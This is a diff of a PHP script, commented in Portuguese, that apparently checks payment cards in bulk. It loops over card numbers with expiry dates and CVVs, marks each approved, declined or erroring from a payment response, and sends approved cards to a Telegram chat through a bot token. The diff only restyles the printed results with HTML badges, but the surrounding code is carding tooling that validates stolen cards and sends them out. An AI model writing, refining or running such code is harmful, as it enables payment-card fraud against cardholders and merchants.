@@ -133,17 +133,17 @@ foreach ($cartoes as $card) {
                                "⏳ Tempo: ($tempo_resposta SEG)";
             sendTelegramMessage($chatId, $telegramMessage, $botToken);
 
-            echo "Aprovada » $cc|$mes|$ano|$cvv » Retorno: $message » Tempo: ($tempo_resposta SEG) »<br>";
+            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
         } elseif (strpos($resp_text, 'is3DSecureRequired') !== false) {
-            echo "Aprovada » $cc|$mes|$ano|$cvv » Retorno: $message » Tempo: ($tempo_resposta SEG) »<br>";
+            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
         } else {
-            echo "Reprovada » $cc|$mes|$ano|$cvv » Retorno: $message » Tempo: ($tempo_resposta SEG) »<br>";
+            echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='text-danger'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
         }
 
         sleep(5); // Espera 5 segundos antes de processar o próximo cartão
 
     } catch (Exception $e) {
-        echo "Erro » $cc|$mes|$ano|$cvv » Mensagem: " . $e->getMessage() . " » Tempo: ($tempo_resposta SEG) »<br>";
+        echo "<span class='badge badge-danger'>Erro</span> » $cc|$mes|$ano|$cvv » <b>Mensagem: <span class='text-danger'>" . $e->getMessage() . "</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
     }
 }
 ?>
